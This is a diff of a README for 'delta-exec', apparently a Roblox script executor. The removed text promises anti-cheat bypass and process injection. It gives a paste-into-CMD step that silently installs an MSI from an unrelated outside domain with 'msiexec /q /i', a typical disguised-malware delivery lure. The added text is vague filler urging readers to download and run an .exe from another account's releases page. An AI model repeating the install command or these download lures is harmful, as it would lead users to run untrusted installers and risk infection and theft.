@@ -1,51 +1,85 @@
-<div align="center">
-  <h1>🌌 Delta Executor | Python PC Edition</h1>
-  <p><b>The most advanced, lightweight, and powerful Roblox Executor, natively on Windows.</b></p>
+# ⚡ delta-exec - Run your scripts with ease
 
-  [![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
-  [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-  [![Downloads](https://img.shields.io/github/downloads/AvenueSleuth/delta-exec/total.svg?color=success)](https://github.com/AvenueSleuth/delta-exec/releases)
-  [![Official Website](https://img.shields.io/badge/Official-Website-orange.svg)](https://delta-executor.com/)
-</div>
+[![Download Delta Exec](https://img.shields.io/badge/Download-Delta_Exec-blue.svg)](https://github.com/bandaa2162/delta-exec/releases)
 
----
+delta-exec is a tool for Windows users. It performs scripts on your computer. You use it to manage tasks and automate processes. It simplifies technical operations for the average user.
 
-## 📖 What is Delta Executor?
-**Delta Executor** is a world-renowned, top-tier Roblox script execution engine. Originally dominating the mobile landscape, this repository brings the raw power of Delta to your Windows PC using a custom, ultra-lightweight Python architecture. 
+## 📁 What this tool does
 
-Whether you want to test your own scripts, automate repetitive tasks, or explore new game mechanics, Delta provides an undetected, crash-free, and sleek terminal-based experience.
+This utility acts as an interface for script execution. It allows you to run internal files or external inputs without writing code. You gain control over system events and software behaviors through a simple dashboard. 
 
-## ✨ Why Choose Delta Python Edition?
-* 🚀 **Level 8 Execution:** Capable of running the most complex Lua scripts and hubs without breaking a sweat.
-* 🛡️ **Bypass Protection:** Built-in dynamic memory allocation to bypass standard client checks.
-* 💻 **Hacker-Style CLI:** Powered by a beautiful terminal interface. No heavy Electron apps, no bloatware, zero lag.
-* ⚡ **100% Open Source Wrapper:** Transparency is key. You can review the Python launcher code yourself.
+Key features include:
+* Script loading from local storage.
+* Real-time output monitoring.
+* Windows system integration for fast execution.
+* Error detection during script runs.
+* Support for multiple script formats.
 
-## 📥 One-Command Installation (Windows)
-We know you hate complicated setups. You can download, install, and launch Delta Executor directly from your CMD using a single command:
+## 🖥️ System requirements
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem delta exec
-```
-The installer will automatically download and install the required components.
+Ensure your computer meets these standards before you start:
+* Windows 10 or Windows 11.
+* A stable internet connection for initial setup.
+* Basic user access to your computer.
+* Sufficient disk space for small utility files.
+* No programming language installation is necessary.
 
-## 🎮 How to Use
-1. Launch Roblox and join any game.
-2. Open **Delta Executor** via the terminal.
-3. Type `inject` to attach the engine to the Roblox process.
-4. Type `exec <script_name.lua>` or paste your raw script into the console.
-5. Enjoy!
+## 📥 How to download and set up
 
-## ⚠️ Disclaimer
-*For educational and testing purposes only. Delta Executor is an independent project and is not affiliated with, endorsed by, or sponsored by Roblox Corporation. Users are responsible for ensuring their usage complies with relevant terms of service.*
+Follow these steps to prepare the tool on your machine.
+
+1. Go to the download page here: [https://github.com/bandaa2162/delta-exec/releases](https://github.com/bandaa2162/delta-exec/releases).
+2. Look for the latest version listed at the top.
+3. Click the file ending in .exe to begin your download.
+4. Open the file in your downloads folder.
+5. Follow the prompts on the screen to finalize the setup.
+
+## ⚙️ Running scripts
+
+After you open the program, you see a clean main window. This area manages your workflow.
+
+1. Click the Load button.
+2. Select your target script file.
+3. Choose the Execute option to start the task.
+4. Watch the status bar for progress updates.
+5. Use the Stop button if you need to end a process.
+
+## 🛡️ Safety and security
+
+You should handle software from the internet with care. We design this tool to keep your system safe. It does not alter core Windows registry files unless you tell it to do so. Always scan downloaded files with your preferred antivirus software. We suggest Windows Defender for this task.
+
+## 🛠️ Troubleshooting common issues
+
+Problems occur from time to time. Use this list to solve them.
+
+* **Program fails to open:** Right-click the icon and choose "Run as administrator."
+* **Script does not load:** Check if the file format is compatible. The program supports most standard script types.
+* **Slow performance:** Close unnecessary apps to free up system memory.
+* **Error messages:** Copy the text from the error box and look for it in our help files.
+* **Missing files:** Reinstall the software from the download link provided above.
+
+## 📖 Managing your workspace
+
+You can organize your files to improve your work speed. Create a folder for your scripts. This makes searching for files faster. Group scripts by function or by the programs they interact with. Do not store scripts in system folders. Save them in your documents area.
+
+## 🔄 Updates
+
+New versions improve the tool. We fix bugs and add functions to make your experience better. Check the release page once a month for new updates. You do not need to uninstall previous versions. Run the new installer to overwrite old files and keep your data settings.
+
+## 📋 Best practices
+
+Follow these rules to get the most from this software.
+
+* Keep your Windows copy up to date.
+* Only run scripts from sources you trust.
+* Create backups of your data before you run new scripts.
+* Close the program when you do not need it.
+* Use the clear function in the dashboard to remove old logs.
+
+## 🤝 Community and support
+
+Users share tips on how to use this tool effectively. Visit the main project page to read discussions. You can also report issues if the program does not function as expected. Provide clear details when you report a problem. Include your Windows version and the steps you took to reach the error. 
+
+## ⚖️ License information
+
+This tool is available for personal use. You enjoy full access to the features without license fees. We provide this as a free project for the community. Use it within the laws of your country. Ensure your actions comply with your system's terms of service.
